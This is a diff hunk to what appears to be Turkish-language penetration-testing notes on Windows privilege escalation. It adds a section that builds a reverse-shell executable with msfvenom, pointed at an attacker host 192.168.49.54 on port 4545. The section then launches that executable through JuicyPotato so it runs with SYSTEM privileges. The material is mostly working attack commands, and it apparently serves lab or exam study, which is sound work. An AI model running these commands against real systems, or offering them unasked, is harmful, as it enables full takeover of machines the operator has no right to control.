@@ -147,6 +147,22 @@ JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\temp\whoa
 .\JuicyPotato.exe -t * -p powershell.exe -a "-c 'whoami | Out-File C:\temp\whoami.txt'"
 ```
 
+#### Reverse Shell Payload ile JuicyPotato
+
+Attacker tarafında msfvenom ile reverse shell payload oluştur:
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.54 LPORT=4545 -f exe -o shell.exe
+```
+
+Hedefte `shell.exe` dosyasını ve `jp.exe` (JuicyPotato) dosyasını bulunduktan sonra, hedefte aşağıdaki komutu çalıştır:
+
+```cmd
+.\jp.exe -t * -p shell.exe -l 4545
+```
+
+Bu komut JuicyPotato'yu kullanarak `shell.exe` dosyasını SYSTEM privilege'leriyle çalıştırıp reverse shell bağlantısını başlatır.
+
 #### **RoguePotato**
 
 🖥️ CMD ile:
